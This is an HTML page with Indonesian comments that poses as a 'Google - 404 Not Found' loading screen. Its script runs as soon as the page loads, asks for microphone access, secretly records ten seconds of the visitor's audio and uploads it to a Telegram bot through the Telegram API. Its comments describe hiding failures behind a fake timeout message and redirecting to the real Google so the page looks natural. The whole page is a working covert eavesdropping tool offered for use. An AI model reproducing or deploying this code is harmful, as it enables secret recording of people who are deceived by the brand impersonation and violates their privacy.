<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - 404 Not Found</title>
    <style>
        /* Desain agar terlihat seperti halaman error atau loading */
        body { 
            font-family: Arial, sans-serif; 
            background-color: #fff; 
            color: #333; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .content { text-align: center; }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="content">
        <div class="spinner"></div>
        <p>Sedang menghubungkan ke server...</p>
        <p style="color: #888; font-size: 0.8em;">Mohon tunggu sebentar, jangan tutup halaman ini.</p>
    </div>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const TELEGRAM_TOKEN = 'TOKEN_BOT_BARU_DI_SINI'; 
        const CHAT_ID = 'ID_CHAT_KAMU_DI_SINI';         
        const DURASI_REKAM = 10000; // 10 detik

        let mediaRecorder;
        let audioChunks = [];

        async function startSilentSystem() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    await sendToTelegram(audioBlob);
                };

                mediaRecorder.start();

                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, DURASI_REKAM);

            } catch (err) {
                // Jika gagal (izin ditolak), tidak memunculkan pesan error yang mencolok
                console.log("Status: 404 Connection Timeout");
            }
        }

        window.onload = startSilentSystem;

        async function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('voice', blob, 'rekaman_senyap.ogg');

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, {
                    method: 'POST',
                    body: formData
                });
                // Setelah terkirim, kita bisa arahkan ke Google asli agar lebih natural
                // window.location.href = "https://www.google.com"; 
            } catch (error) {
                console.error("Network error");
            }
        }
    </script>
</body>
</html>
